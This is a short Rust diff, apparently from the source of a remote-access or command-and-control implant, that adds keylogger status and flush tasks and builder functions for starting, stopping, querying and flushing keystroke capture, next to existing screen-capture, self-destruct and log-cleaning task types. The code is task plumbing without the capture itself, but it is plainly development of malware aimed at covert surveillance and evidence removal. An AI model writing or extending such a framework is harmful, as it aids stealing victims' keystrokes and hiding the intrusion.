@@ -54,6 +54,8 @@ pub enum TaskType {
     ScreenCapture,
     KeyloggerStart,
     KeyloggerStop,
+    KeyloggerStatus,
+    KeyloggerFlush,
     // Cleanup
     SelfDestruct,
     LogCleaning,
@@ -180,8 +182,8 @@ impl Task {
     }
 
     pub fn set_result(&mut self, result: TaskResult) {
-        self.result = Some(result);
         self.status = result.status.clone();
+        self.result = Some(result);
     }
 }
 
@@ -404,6 +406,30 @@ impl TaskBuilder {
             .with_parameter("executable_path".to_string(), executable_path)
             .with_timeout(30)
             .with_priority(180)
+    }
+
+    pub fn keylogger_start() -> Task {
+        Task::new(TaskType::KeyloggerStart)
+            .with_timeout(30)
+            .with_priority(200)
+    }
+
+    pub fn keylogger_stop() -> Task {
+        Task::new(TaskType::KeyloggerStop)
+            .with_timeout(30)
+            .with_priority(200)
+    }
+
+    pub fn keylogger_status() -> Task {
+        Task::new(TaskType::KeyloggerStatus)
+            .with_timeout(10)
+            .with_priority(100)
+    }
+
+    pub fn keylogger_flush() -> Task {
+        Task::new(TaskType::KeyloggerFlush)
+            .with_timeout(30)
+            .with_priority(150)
     }
 
     pub fn self_destruct(delay_seconds: Option<u64>) -> Task {
